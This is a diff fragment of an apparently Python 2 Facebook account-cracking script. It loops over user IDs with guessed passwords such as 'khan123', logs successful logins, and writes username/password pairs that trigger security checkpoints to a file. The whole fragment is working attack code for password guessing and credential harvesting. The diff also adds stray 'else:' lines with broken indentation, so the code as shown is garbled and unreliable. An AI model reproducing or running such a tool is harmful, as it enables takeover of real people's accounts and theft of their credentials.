@@ -397,14 +397,14 @@ def pilih_super():
 															if 'access_token' in q:
 																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
 																oks.append(user+pass8)
-
+else:
 																if 'www.facebook.com' in q["error_msg"]:
 																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
 																	cek = open("out/checkpoint.txt", "a")
 																	cek.write(user+"|"+pass8+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass8)														
-           
+           else:
  	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
 			pass9 = ('khan123')
